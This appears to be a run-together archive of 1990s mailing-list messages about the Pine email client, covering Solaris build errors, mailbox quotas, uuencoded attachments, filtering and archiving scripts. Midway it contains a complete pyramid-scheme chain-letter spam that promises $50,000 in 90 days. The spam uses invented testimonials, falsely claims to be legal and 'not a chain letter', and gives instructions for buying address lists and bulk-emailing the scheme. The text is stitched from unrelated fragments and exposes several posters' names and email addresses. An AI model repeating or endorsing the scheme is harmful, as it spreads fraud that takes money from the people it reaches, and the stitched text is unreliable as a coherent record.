slower than pine AFAICS.

BTW, did you guys have a hard time quoting this mail? Pico must die

hello guys,

I am at a company that has a number of SUN SPARC and Solaris machines 
running NIS. I want to be able to set up the global pine config files such
that no matter which machine anyone logs into, they all use the same
pine.conf . The program seems to only look in /usr/local/lib/ for those,
but this location is a problem for two reasons. One, we'd have to install
the global files on each machine, and two, our 4.1.3 machines don't even
have that directory.

The PC-PINE version can take the 'PINECONF' variable , is there an
equivalent for Unix ? Maybe some other solution?

I really appreciate the help and quick response!

I am trying to use a viewpoint emulation with PINE.  The message I get
is:

Your terminal, of type "viewpoint", is lacking functions needed to run
pine....

I have an existing viewpoint emulation that works fine in Unix and with
my
existing applications.  Do you have any suggestions, or is there
somewhere
that I can determine more specifically what functions are lacking?  Am I

missing Function Keys or Video Attributes within my viewpoint terminfo
file?

Any suggestions would be appreciated.

I am a student at PHS and I am trying to find information of weighted
grades in school systems around the US. Would you be so kind as to send
me some inforamation on the weighting standards of your school. I would
really appreciate it. Thank-you.

>From "Pine Technical Notes"

-------(begin)  
Design changes introduced in Pine 3.8x facilitate Pine users filtering
email. You still have to get a filtering program and configure it
correctly, but Pine now allows users to specify a set of incoming-folders.
Pine will separate out all the folders listed as incoming-folders and
offer convenient access to these. We hope that in the future Pine will be
able to offer new message counts for all of the incoming folders. 
-----(end)

As part of a class project, I want to write a some sort of filter for
incoming mail that can be used with Pine.  Anyone know of any other
filters around that I can take a look at? (Besides the Elm and Procmail
filters referenced in the Technical notes.)

Also, I don't subscribe to the list, so please reply to the above address.

Thanks.

-Jim

Every now and again, I receive a message with a plain text attachment that pine
refuses to display, claiming that there are special characters that can only be
displayed with X11.

Here's the sample attachment, but I don't see the special characters.

Is there anything in the following headers that is causing pine to see
something that isn't there? I'm using Pine 3.95 on Linux.

MIME problem.

MS is a special character. It says: "Bomb Redmont".

Nice. Throw that rubbish away. It's an abomination. Gill Bates must
die RSN. You can safely discard the attachment, it's probably an ad
for Windog2000 (to be released RSN).

Cheers,
Robin

Hello friends, especially Robin !!!

We have a trouble:  
	Recently, we have tried to install Pine 3.96
	over a Sun ULTRA with SunOS 5.5.1 Generic.

	As we tried to compile the program, sow the next error messages:
	
	.
	.
	.
	cd ../c-client;make
	make:fatal error:don't know how to make target '../c-client/osdep.h'
	current working directory/trabajo/pine/pine3.96/imap/non-ansi/ipopd
	***error code 1
	make: fatal error:command failed for target 'build'
	.	
	.
	.
	current working directory/trabajo/pine/pine3.96/imap/'sun'
	***error code 1
	make:fatal error: command failed for target 'sun'
	.
	.
	./cmplh/p2.sh <pine.hlp> helptext.h 
	make:fatal error:command failed for target '/c-client/mail.h'
	

 I hope that the group can help me. Couse we really need the mail in
function. The staff, the school and I,  will be so gratefull.

Hasta luego, amigos!!

Have you tried make sol or make gso? Do you have Sun's compiler or gcc?

quit pine, and type "pico .pinerc".  You'll find the list of folders in
there, quite easy to edit and order however you like.  My folders are
prioritized this way.

This is what crontab and shell scripts do quite well.

Ha ha, mail to the list to ask to be unsubscribed?  Do you realise how
rude/annoying that is to 99% of mailing list readers?  You got the message
when you subscribed, save it to a folder called "unsub" and keep that
folder forever.

Pine gurus,

Is there any way to setup a global configuration that will automatically
move sent-mail folders at the beginning of each month?  Many of our users
don't move their folders which makes it hard for me to periodically
"purge" old folders.  

Thanks in advance!

Try subaddressing.  Filtering is a pain in the butt, I used to do it.
I used to have a 1000 line procmailrc.  Then I switched to qmail as my
MTA and started using subaddressing heavily.  I'm not even using procmail
at the moment.  (You can do subaddressing with sendmail+procmail by
enabling procmail as the local delivery agent... but I didn't find it
as nice to use.)

I have no problem when 100 mails come in.  They'll come in on my lower
priority folders typically.  Unless it's a whack of cron jobs finishing
around the same time.  But I can easily avoid the busy folders when I
need to.

Oh fine then, hit |form and write a script called form which does the
context sensitive crap.

I don't understand what you're asking.  Will that patch be included in
pine?  No, I doubt it.  It uses a qmail feature to set the envelope from,
because I couldn't be bothered to do it in a way that works with sendmail.
But isn't this the point of having the source code?

Furthermore, GPL is not a holy grail that all software must meet.
I'm one of the Apache devlopers.  Apache is not GPL'd.  GPL has various
limitations that can actually hinder its use; or hinder the involvement
of some developers.  Apache is available under a variant of the Berkeley
license.

It doesn't matter to me if folks have to construct my web page address,
or if they have to construct my email address.  It takes some basic

Pine is missing per-folder configuration.

Uh, it's not pine's fault that I didn't have pgp5 going.  It's my fault
for not installing pgp5.  The only thing pine didn't do right was allow
me to override my broken filter without completely disabling it.

What prune script?  I never delete anything in the archives.  My scripts
amount to:

    date="`date +\%Y\%m\%d`"
    cd $HOME/mail/archive
    for folder in *; do
	if [ -f $folder/$date ]; then
	    echo "$folder/$date already exists!"
	elif [ -f $folder/current ]; then
	    mv $folder/current $folder/$date && chmod 400 $folder/$date
	fi
    done

And then two days later:

    find $HOME/mail/archive -name '[0-9]*[0-9]' -mtime +14 -print0 \
	| xargs -0r gzip -9

Nothing is deleted.

What's not an argument?  I never have to make the decision of what to
keep.  It's all kept.  I'm saying that the problem you presented just
doesn't exist for me.

Yes, this sucks like hell.  You're not managing your data well -- if you
break things up into individual messages you'll blow one of many limits
on your filesystem (inodes, or just simply the directory scan time).
This is why news spools are going to cyclic files instead of the hierarchy
they've been for the past 15+ years.

If you're willing to split things into individual files and suffer the
performance/resource overhead of doing that then glimpse is trivial
yes.

Sure, it's attached.  I release it into the public domain.  But it
requires qmail subaddressing.

Oh try pine via IMAP with the server running on an efficient mail
format ... headers only.  It works OK over slow serial lines too
(although I tunnel it via ssh with compression).

One of pine's best features in my opinion is that it scales from the
newbie up to the expert.  The newbie doesn't even need to read anything
before using it -- it's the mailer I always set up newbies with.

I've never had pico flake out on me.  I'm using vi at the moment however,
which I usually do when I need to actually edit.  pico is great for quick
answers.  Anything more than a half-dozen lines and I hit ^_. 

My number one feature request for pine is IMAP 4 disconnected support.  A
lot of the things you're arguing to be put into pine are things that I
would always do on the server -- because I access mail from three
locations IMAP is important to me.  I'd have to ensure all the three pine
configs agreed on filtering settings; which I know is possible, but I find
it easier to let other things running on the server itself take care of
the filtering.

I think it is. Can I use the modified source in a commercial
environment?  What if the UoW decides to change their licence?  This
is purely hypothetical, and I'm not imposing they would, but that's a
"business" decision - if you spent a lot of time (=money) to set up a
site "for pine".

Which is different from the pine licence. Correct me if I'm wrong, but 
I may distribute modified versions of Apache, may I not? Anyway,
that's not the point (my point, that is) here. As I see it (and I
don't subscribe to RSM's communists drivel), the GPL and similarly
oriented licences promote the development of software. IMHO, the pine
licence does it not in the same way. But that, again, is not the point 
here. Let's bury the licence discussion, shall we?

It's still hostile towards people who want to help on the internet. We've
had this very same discussion here when Good Ole Bruce was desperately
trying to understand sendmail so that he could forge his address. Sure I
can disassemble a "nospam" address - but do I want to. Ultimately, the
decision lies with the poster, but I will not condone this behaviour, nor
will I encourage it by being polite or helpful. The point I was trying 
to make, though, was that pine could be a lot more user-friendly if it 
treated correct sigs in a sensible manner.

That's *your* presonal view. The point *I* was trying to make was
that Gnus' expiry mechanism is something pine should have. I don't
expect an on-and-off user to understand archiving. If I tell her that
all mail that isn't archived will be deleted after 2 weeks, she'll
understand.

Exquise me - but what's the advantage of pico over vi? It's not faster,
and that's about the only thing I could ever think of if I were to say
something positive about pico. You simply *cannot* yank the quotes I use
properly with pico. Mine and some less fancy ones. I remember clearly
cursing heavily when several people on one list I subscribed to as a
newbie were using supercite. Pine needs a better editor, that's all I'm
saying. I don't expect bells and whistles (actually, I quite like the
way quotes from different posters get different colours here), but
pine's editor should provide more in the yanking area than it
currently does.

Unless you know English, I don't think there's much in the help
department for you. Try the UoW's pine website:

Hello.  I am a student at Binghamton University.  I am unable to receive
e-mail over the pine system and I need this as a part of my studies (I get
work for chemistry via e-mail).
When I open the pine system it immediatly reads "mail box over quota."
Under this it says "read above message andthen press return."  I do this
yet I still do not receive my mail.  My mailbox is not full because I have
emptied it out and I have 7 messages left in it.  It is now Tuesday and I
haven't received any new mail since Sunday.  This is very distressing.  I
would greatly appreciate a reply as soon as possible so I can get my work
again.
	Thank you very much,
	Alexandra Joseph
 	(SB97littlegirl@juno.com, since I am unable to receive mail on my
"bg18524@binghamton.edu address)

You have a quota problem. If you're familiar with the system *cough*
try saying:

    du ~/

and then rm all files/dirs that you don't need. Quota is something by
which *all* your files are affected, not just your mail.

If in doubt, consult your helpdesk or the local hardware store...

Cheers,
Robin

Hmmmm... SunOS 5.x is "really" Solaris 2.x.  Hnece, if you check the
doc/pine-ports file, you'll find the following "build codes:...

        gso     Sun Solaris using gcc compiler
	...
        sol     Sun Solaris (see gso port)
        sun     Sun SunOS 4.1

As you can see "sun" is for SunOS 4.1, whilst "sol" is for Solaris.
However if you're using the GNU C compiler (gcc) you should instead use
"gso".

Cheers,

Dear Friend,

The enclosed information is something I almost let slip through my fingers.
Fortunately, sometime later I reread everything and gave some thought and
study to it.

My name is Christopher Erickson.  Two years ago, the corporation I worked
at
for the past twelve years downsized and they eliminated my position.  After
unproductive job interviews,  I decided to open my own business.  Over the
past year, I incurred many unforeseen financial problems.  I owed my
family, friends, and creditors more than $35,000.  The economy was taking a
toll on
my business and I just could not seem to make ends meet.  I had to
refinance
and borrow against my home to support my family and struggling business.  I
truly believe it was wrong for me to be in debt like this.  AT THAT MOMENT
something significant happened in my life and I am writing to share my
experience in hopes that this will change your life FOREVER . . .
FINANCIALLY!!!

In mid-December, I received this program via email.  Six months before
receiving this program I had been sending away for information on various
business opportunities.  All of the programs I received, in my opinion,
were
not cost effective.  They were either too difficult for
me to comprehend or the initial investment was too much for me to risk
seeing if they worked or not.  One claimed I had made a million dollars in
one year . . . it didn't tell me I'd have to write a book to make it.

But like I was saying, in December of '92 I received this program.  I did
not send for it, or ask for it, they just got my name off a mailing list.
THANK GOODNESS FOR THAT!!!  After reading it several times, to make sure I
was reading it correctly, I could not believe my eyes.  Here was a MONEY
MAKING PHENOMENON.  I could invest as much as I wanted to start, without
putting me further in debt.  After I got a pencil and paper and figured it
out, I would at least get my money back.  After determining that the
program
is LEGAL and NOT A CHAIN LETTER, I decided "WHY NOT."

Initially I sent out 10,000 emails.  It only cost me about $15.00 for my
time on-line.  The great thing about email is that I did not need any money
for printing to send out the program, only the cost to fulfill my orders. 
I am telling you like it is, I hope it does not turn you off, but I
promised
myself that I would not "rip-off" anyone, no matter how much money it cost
me. 

In less than one week, I was starting to receive orders for REPORT #1. By
January 13th, I had received 26 orders for REPORT #1.  When you read the
GUARANTEE in the program, you will see that "YOU MUST RECEIVE 15 TO 20
ORDERS FOR REPORT #1 WITHIN TWO WEEKS.  IF YOU DO NOT, SEND OUT MORE
PROGRAMS UNTIL YOU DO!"  My first step in making $50,000 in 20 to 90 days
was done.  By January 30th, I had received 196 orders for REPORT #2.  If
you
go back to the GUARANTEE, "YOU MUST RECEIVE 100 OR MORE ORDERS FOR REPORT
#2
WITHIN TWO WEEKS.  IF NOT, SEND OUT MORE PROGRAMS UNTIL YOU DO. ONCE YOU
HAVE 100 ORDERS, THE REST IS EASY, RELAX, YOU WILL MAKE YOUR $50,000 GOAL."
Well, I had 196 orders for REPORT #2, 96 more than I needed.  So I sat back
and relaxed.  By March 19th, of my emailing of 10,000, I received $58,000
with more coming in every day.

I paid off  ALL my debts and bought a much needed new car.  Please take
time
to read the attached program.  It WILL CHANGE YOUR LIFE FOREVER! Remember,
it will not work  if you do not try it.  This program does work, but you
must follow it EXACTLY!  Especially the rules of not trying to place your
name in a different place.  It doesn't work, you'll lose out
on a  lot  of  money!  REPORT  #2  explains this.  Always follow the
guarantee, 15 to 20  orders  for REPORT #1, and 100 or more orders for
REPORT #2.  You will make  $50,000 or more in 20 to 90 days.  I AM LIVING
PROOF THAT IT WORKS!!!

If you choose not to participate in this program, I am sorry.  It really is
a great opportunity with little cost or risk to you.  If you choose to
participate, follow the program and you will be on your way to financial
security.

If you are a fellow business owner and you are in financial trouble like I
was, or you want to start your own business, consider this a sign.  I DID!

                                        Sincerely,
                                        Christopher Erickson

PS  Do you have any idea what 11,700 $5 bills ($58,500) look like piled up
on a kitchen table? It is AWESOME!

"THREW IT AWAY"

"I  had  received  this program before.  I  threw  it away, but later
wondered if I should not have given it a try.  Of course, I had no idea who
to contact to get a copy, so I had to wait until I was emailed another copy
of the program.  Eleven months passed, then it came.  I DID NOT throw this
one away.  I made $41,000 on the first try." 
                                        Dawn W., Evansville, IN

"NO FREE LUNCH"

"My late father always told me, remember, Alan, there is no free lunch in
life.  You get out of life what you put into it.'  Through trial and error
and a somewhat slow frustrating start, I finally figured it out. The
program
works very well.  I just had to find the right target group of people to
email it to.  So far this year, I have made over $63,000 using this
program.
I know my dad would have been very proud of me."
                                        Alan B., Philadelphia, PA

A PERSONAL NOTE FROM THE ORIGINATOR OF THIS PROGRAM

By the time you have read the enclosed information and looked over the
enclosed program and reports, you should have concluded that such a
program,
and  one that is legal,  could not have been created by an amateur. 

Let me tell you a little about myself.  I had a profitable business for ten
years.  Then in 1979 my business began falling off.  I was doing the same
things that were previously successful for me, but it was not working.
Finally, I figured it out.  It was not me, it was the economy. Inflation
and
recession had replaced the stable economy that had been with us since 1945.
I do not have to tell you what happened to the unemployment rate . . .
because many of you know from first hand experience. There were more
failures and bankruptcies than ever before.

You have just received information that can give you FINANCIAL FREEDOM for
the rest of your life, with "NO RISK" and "JUST A LITTLE BIT OF EFFORT."
You can make more money in the next few months than you have ever imagined.

I should also point out that I will not see a penny of your money, nor
anyone else who has provided a testimonial for this program.  I have
already
made more than FOUR MILLION DOLLARS!  I have retired from the program after
sending out more than 16,000 programs.  Now I have several offices that
market this and several other programs here in the US and overseas.  By
Spring, we wish to market the 'Internet' by a partnership with AMERICA ON
LINE. 

Follow the program EXACTLY AS INSTRUCTED.  Do not change it in any way. It
works exceedingly well as it is now.  Remember to email a copy of this
exciting program to everyone that you can think of.  One of the people you
send this to may send out 50,000 . . . and your name will be on every one
of
them! .  Remember though, the more you send out, the more potential
customers you will reach. 

So my friend, I have given you the ideas, information, materials and
opportunity to become financially independent, IT IS UP TO YOU NOW!

"THINK ABOUT IT"

Before you delete this program from your mailbox, as I almost did, take a
little time to read it and REALLY THINK ABOUT IT.  Get a pencil and figure
out what could happen when YOU participate.  Figure out the worst possible
response and no matter how you calculate it, you will still make a lot of
money!  Definitely get back what you invested.  Any doubts you have will
vanish when your first orders come in.  IT WORKS!
                                        Paul Johnson, Raleigh, NC

HERE'S HOW THIS AMAZING PROGRAM WILL MAKE YOU $$$$$$

Let us say that you decide to start small, just to see how it goes.  We
will assume you and all those involved send out 2,000 programs each. Let us
also assume that the mailing receives a .5% response.  Using a good list,
the
response could be much  better.  Also, many people will send out hundreds
of
thousands of programs instead of 2,000.  Nevertheless, continuing with this
example, you send out only 2,000 programs.  With a 5% response, that is
only
10 orders for REPORT #1.  Those 10 people respond by sending out 2,000
programs each for a total of 20,000.  Out of those .5%, 100 people respond
and order REPORT #2.  Those 100 email out 2,000 programs each for a total
of
200,000.  The .5% response to that is 1,000 orders for REPORT #3.  Those
1,000 send out 2,000 programs each for a total of 2,000,000. The .5%
response to that is 10,000 orders for REPORT #4. That's 10,000 five dollar
bills for you. CASH!!! Your total income in the example is $50 + $ 500 + $
5,000 + $ 50,000 for a total of $55,000!!! 

REMEMBER FRIEND, THIS IS ASSUMING 1,900 OUT OF 2,000 PEOPLE YOU MAIL TO
WILL
DO ABSOLUTELY NOTHING... AND TRASH THIS PROGRAM! DARE TO THINK FOR A MOMENT
WHAT WOULD HAPPEN IF EVERYONE OR JUST  SENT OUT 100,000 PROGRAMS INSTEAD
OF
ONLY 2,000. Believe me, many people will do that and more! By the way, your
cost to participate is practically nothing if you follow the program as it
is outlined. You obviously already have an internet connection and email is
FREE!!! REPORT #3 will show you the best methods for bulk emailing and
purchasing email lists. 

THIS IS A LEGITIMATE, LEGAL, MONEY MAKING OPPORTUNITY. It does not require
you to come into contact with people, do any hard work, and best of all,
you
never have to leave the house except to get your mail. If you believe that
someday you will get that big break that you have been waiting for, THIS IS
IT! Simply follow the instructions, and your dream will come true. This
multi-level email order marketing program works perfectly... 100% EVERY
TIME. Email is the sales tool of the future. Take advantage of this
non-commercialized method of advertising NOW!! The longer you wait, the
more
people will be doing business using email. Get your piece of the pie!!! 

MULTI-LEVEL MARKETING (MLM) has finally gained respectability. It is being
taught in the Harvard Business School, and both Stanford Research and The
Wall Street Journal have stated that between 50% and 65% of all goods and
services will be sold byMulti-Level methods by the mid to late 1990's. This
is a Multi-Billion Dollar industry and of the 500,000 millionaires in the
USA, 20% (100,000) made their fortune in the last several years in the MLM
industry. Moreover, statistics show 45 people become millionaires everyday
through Multi-Level Marketing. 
This is not a chain letter, but a perfectly legal money making opportunity.
Basically, this is what we do: As with all multi-level business, we build
our business by recruiting new partners and selling our products. Every
state in the USA allows you to recruit new multi-level business partners,
and we offer a product for EVERY dollar sent. YOUR ORDERS COME AND ARE
FILLED THROUGH THE MAIL, so you are not involved in personal selling. You
do
it privately in your own home or office.

This is the GREATEST Multi-Level Mail Order Marketing anywhere:

Step (1) Order all four (4) REPORTS listed by NAME AND NUMBER. Do this by
ordering the REPORT from each of the four (4) names listed on the next
page.
For each REPORT, send $5.00 cash and a SELF-ADDRESSED STAMPED ENVELOPE
(BUSINESS SIZE # 10) to the person listed on that SPECIFIC REPORT.
International orders should also include $1.00 extra for postage. It is
essential that you specify the NAME and NUMBER of the REPORT requested tp
the person you are ordering from. You will need ALL FOUR (4) REPORTS
because
you will be REPRINTING and RESELLING them. DO NOT alter the names or
sequence other than what the instructions say. IMPORTANT: Always provide
same day service on all orders.

Step (2) Replace the name and address under REPORT #1 with your name,
moving
the one that was there down to REPORT #2. Drop the name and address under
REPORT #2 TO REPORT #3, moving the one that was there to REPORT #4. The
name
and address that was under REPORT #4 is dropped from the list, and this
party is no doubt on the way to the bank. When doing this make certain you
type the names and addresses ACCURATELY! DO NOT MIX UP MOVING THE PRODUCT
OR
REPORT POSITIONS!!! 

Step (3) Having made the required changes in the NAME list, save it as a
text (txt) file in it's own directory to be used with whatever email
program
you like. Again, REPORT #3 will tell you the best methods of BULK EMAILING
and acquiring email lists.

Step (4) Email a copy of the entire (all of this is very important) to
everyone whose address you can get your hands on. Start with friends and
relatives since you can encourage them to take advantage of this fabulous
money-making opportunity. That's what I did. And they love me now, more
than ever. Then email to anyone and everyone! Use your imagination! You can

get email addresses from companies on the internet who specialize in email
lists. Thes are very cheap, 100,000 addresses for around $35.00

IMPORTANT: You won't get a good response if you use an old list, so always
request a FRESH, NEW LIST. You will find out where to purchase these lists
when you order the four (4) REPORTS. 


ALWAYS PROVIDE SAME DAY SERVICE ON ALL ORDERS!!!

REQUIRED REPORTS

*** Order each REPORT by NUMBER and NAME***

CONCLUSION
 
I am enjoying my fortune that I made by sending out this program. You too,
will be making money in 20 to 90 days, if you follow the SIMPLE STEPS
outlined in this mailing.

To be financially independent is to be FREE.  Free to make financial
decisions as never before.  Go into business, get into investments, retire
or take a vacation.  No longer will a lack of money hold you back.

However, very few people reach financial independence, because when
opportunity knocks, they choose to ignore it.  It is much easier to say
"NO"
than "YES", and this is the question that you must answer.  Will YOU ignore
this amazing opportunity or will you take advantage of it?
If you do nothing, you have indeed missed something and nothing will
change.
Please re-read this material, this is a special opportunity. If you have
any
questions, please feel free to write to the sender of this information. You
will get a prompt and informative reply.

My method is simple.  I sell thousands of people a product for $5.00 that
costs me pennies to produce and email.  I should also point out that this
program is legal and everyone who participates WILL make money. This is not
a chain letter or pyramid scam.  At times you have probably received chain
letters, asking you to send money, on faith, but getting NOTHING in return,
NO product what-so-ever!  Not only are chain letters illegal, but the risk
of someone breaking the chain makes them quite unattractive.

You are offering a legitimate product to your people.  After they purchase
the product from you, they reproduce more and resell them. It's simple free
enterprise.  As you learned from the enclosed material, the PRODUCT is a
series of four 4 FINANCIAL AND BUSINESS REPORTS.  The information contained
in these REPORTS will not only help you in making your participation in
this 
program more rewarding, but will be useful to you in any other business
decisions you make in the years ahead. You are also buying the rights to 
reprint all of the REPORTS, which will be ordered from you by those to whom

you mail this program.  The concise one and two page REPORTS you will be 
buying can easily be reproduced at a local copy center for a cost of about 
5 cents a copy. Best wishes with the program and Good Luck!

"IT WAS TRULY AMAZING"

"Not being the gambling type, it took me several weeks to make up my mind
to
participate in this program.  But conservative as I am, I decided that the
initial investment was so little that there was no way that I could not get
enough orders to at least get my money back.  BOY,
was I ever surprised when I found my medium sized post office box crammed
with orders!  I will make more money this year than any ten years of my
life before."

                                        Mary Riceland, Lansing, MI



TIPS FOR SUCCESS

Send for your four 4 REPORTS immediately so you will have them when the
orders start coming in.  When you receive a order, you MUST send out the
product/service to comply with US Postal and Lottery laws.  Title 18
Sections 1302 and 1341 specifically state that:  "A PRODUCT OR SERVICE MUST
BE EXCHANGED FOR MONEY RECEIVED."

WHILE YOU WAIT FOR THE REPORTS TO ARRIVE:

1. Name your new company. You can use your own name if you desire.

2. Get a post office box (preferred).

3. Edit the names and addresses on the program. You must remember,your
name and address go next to REPORT # 1, and all the others move
down one, with the fourth one being bumped OFF the list. 

4. Obtain as many email addresses as possible to send until you
receive the information on mailing list companies in REPORT#3.

5. Decide on the number of programs you intend to send out.  The  more
you send, and the quicker you send them, the more money you will make.

6. After mailing the programs, get ready to fill the orders.

7. Copy the four 4 REPORTS so you are able to send them out as soon as
you receive an order. IMPORTANT: ALWAYS PROVIDE SAME-DAY
SERVICE ON ALL THE ORDERS YOU RECEIVE!

8. Make certain the letter and reports are neat and legible.

Hi Dave.

As far as I know, pine doesn't handle this type of decoding.  If you are
using a unix system, try uudecode or there is a utility that has versions
for dos and unix called uudeview/uuenview.  There are probably others like
this but one of these should do the trick.

Hope this helps.

I have included in the above attachment a helpsheet on how to use uuencode
and uudecode. It is meant for our Unix machines, but maybe it will help

	Yesterday, I was stuck in Pine and so I turned off the computer in
frustration not thinking of it.  However when I went back in, it said
"Trying to get mailbox lock for process 16507.  Mailbox is open by another
process.  Access is read-only"  Now I can't delete my mail and the mailbox
is filling up quickly.  Can you tell me what to do to rectify this
situation?  Sincerely, 

	Todd Cooper

Hi,


I saw that XFMail users can get:

1. Recieving reciept  (the mail got to it's destination)
  and/or
2. Reading (opening) reciept ( the mail was read/opened).


of the mail that they send.

Is it possible in Pine too?


Thanks,

Yossi

Assuming you are using a shell account with pine do the following steps.

mail
1
pre *
quit

Pine should function again properly.

On UNIX PINE seems to wait for sendmail to return before letting you do
something else. This causes a real long delay for long mailing lists
involving many far away addresses. "enable-background-sending" provides
some relief for this, but you still can't compose (or do anything that
involves an implicit compose) until sendmail is done. Is there a way
around this?

Thanks, Ed

One solution that works pretty well is to use a fast SMTP server. For
example, you might have an SMTP server that does nothing but accept the
submission and relay it to another "smarter" SMTP server for delivery, or
somehow processes it separately for delivery. This allows you to avoid the
waits for DNS lookups that are typically being done by sendmail for each
RCPT command. One difference that users will see is that addressing errors
won't be noticed by the initial SMTP server so there is no immediate
interactive feedback for mistyped domain names, for example. Instead, the
error will come back in a mail message from the second stage of
processing. Some people consider this an advantage.

Hi,

I received more and more email messages forwarded to me as MIME
attchment (in particular, forward from Netscape Mail).

When I tried to view it from Pine Attachment Index menu, I can't 
find an option to display the full header of the attached mail.

I am using Pine3.95.  Will Pine3.96 work?  Or, Pine4.0 when it is
available?

Thank ahead for your advise.

Regards,

Patrick Leung

Dave,
 This is a most excellent question. To my knowledge PC Pine
will not handle UUENCODING type attachments.... full stop. Not
even our Internet Exchange should be able to do this recursive
decoding of attachments using different encoding methods.

 When the IETF (MIME WG)  where "argueing" it out about
 permitting that UUENCODE was a MIME .
 It was outright rejected on the grounds that MIME was the new way to 
go and everyone should ditch their UUENCODING method and should
go to MIME. Unfortunately this was very short sited and it did not happen.
As every single UNIX box on the Internet box on the net has UUENCODE
tools and very very few MIME tools, plus there is a tonne of cruddy
gateways or clients that only do UUENCODING.

Hence this is not a supported mime time. The message sent to you
is firstly defined as a 7 bit MIME encoding (no encoding actually)
encapsulating  a UUENCODED file which is actually containting
and 7 or 8 bit file, most likely 8.

The person that sent you this did exactly what the guys designing
MIME did not agree to. :)

PS. To the guys developing Pine and IMAP. I love Pine and PC-Pine...
 I wish I could use the IMAP over long distance or low bandwidth 
connections but it stalls too much. 

P.P.S.  It would be good if instead of adding more bells and whistles
to Pine that you focus on reducing its memory consumption. 
I think that would win you a International Hero status on the Internet.

Do you guys have shares in the semiconductors 
(RAM) industry NEC/Motorola/Ti ? :)

P.P.P.S. Is Cyrus IMAP also RAM guzzling IMAP implentation?



---------------------

Hello:  I get emails that have attached files that are encoded.  The
encoding looks like this:

MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

-------------

begin 644 rtriso01.doc
MT,/1X*&Q&N$'''''''''''''
etc etc etc

Does anyone know how to easily decode such an attachment with Pine?

thanks,

Hello !!!

I couldn't find any command in pine, but you have reconfigure sendmail,
that he will store his mails in his box and then he will send them after a
while!

								Bye.

Try putting something in one of your init files that does just
that. Since you're on a Linux system, try saying "man biff" for
example.

Maren, if you'd separately send me some more info on your experiences, I'd
be grateful.  (e.g. "stalls" = gets slow, or breaks connection, or ...)
My experience over slow, high-latency links has been a bit better, but
there is still room for tuning.

Most of the memory use issue concerns the c-client driver for the
particular mailbox format you use.  In the past, the mailbox driver for
the defacto std Unix mailbox format read everything into virtual memory.
On some systems this is good, on other systems it is bad.  Sometimes very
bad.  So now in the latest toolkit there is a driver that uses a temp file
for this format instead.  I think you can get an imapd with this driver in
the imap.tar.Z distribution on ftp.cac.washington.edu/mail

Another alternative is to use a different mailbox format, as Cyrus does,
such as "mbx".  But this implies that all access will be via IMAP or POP.

If so, the strategy isn't working, 'cause I aint rich :)

Pine 3.95 apparently uses the logon id instead of the personal-name for
the return address.  This is a problem for me.

An example:  my logon id is "ted"; my personal-name is "ted.rolle";  the
local-domain is "usa.net".  What I need is for the return address to be
"ted.rolle@usa.net"; instead, it forms "ted@usa.net" -- another,
wholly-different person who really exists.

 Is there a work-around?

This falls into the category "questions he'd not be asking if he'd

Yes, there's a way, yes, you need to recompile pine, no, I won't tell
you how. Hehe... }:->

Happy reading (tech-notes recommended).

I have been searching for an answer and have not had any luck. I am
hoping you might be able to help me. I have been trying to send images
using Netscape from my mac to a PC. I have saved them in Tiff, jpeg,
gif.  I don't seem to have any luck. When I attatch the file on my end
the PC gets two file (ie. 1.2 and 1.2.1) and if a picture shows up it is
black and white with lines accross it.  I can't seem to find any
encoding preferences in Netscape and I am baffled.
I appreciate it if anyone had an answer.
Dan

 Hey Guys,

I am at a company that has a number of SUN SPARC and Solaris machines 
running NIS. I want to be able to set up the global pine config files such
that no matter which machine anyone logs into, they all use the same
pine.conf . The program seems to only look in /usr/local/lib/ for those,
but this location is a problem for two reasons. One, we'd have to install
the global files on each machine, and two, our 4.1.3 machines don't even
have that directory.

The PC-PINE version can take the 'PINECONF' variable , is there an
equivalent for Unix ? Maybe some other solution I can't see?

I really appreciate the help and quick response!

Any chance that I can go to Web pages from Pine??

How do people follow sig. files?  After all, it surely can't be true that
people will use Unix programs over Netscape, and willingly give up the
ability to follow links given in e-mail, eh?!  Many mailing lists users
provide a plethora of Web page references, which I guess can be followed
at any time from one Click, from GUIs.  I cannot by any means follow a
fraction of these http references given to quickly check a page, without
wasting a vast amount of time.  Who is going to type in the long ones 
Lynx htpp://..../..../...../..../..../.../~someone/blahblah  ?

People must follow sig.'s with a person's homepage given.  Or do people
who spurn GUIs simply provide these things for decoration?  Like holiday
apples: they look nice, but dig your teeth into them, and find them most
decidedly and plastically inedible.

Can Pine at least type Lynx ... for me?

And by the way, I'm not talking about Pine attachments which are
text/html.  I don't know how that works either, but that is not such a
concern.

Just plain links in text.  

One note as well, 40% of mailing list messages I encounter daily contain 1
or 2 http references on average, and rarely, a whole list of references.

That's a faq. The answer is no.

WMS> If not, are there any UNIX gurus who know how to do this?

Yes, but it involves third party filtering software. Check Nancy
McGough's filtering faq:

WMS> Thanks...please reply to wms@hops.cs.jhu.edu

You can write in the news, you can read there... Anyway: Cc'd...
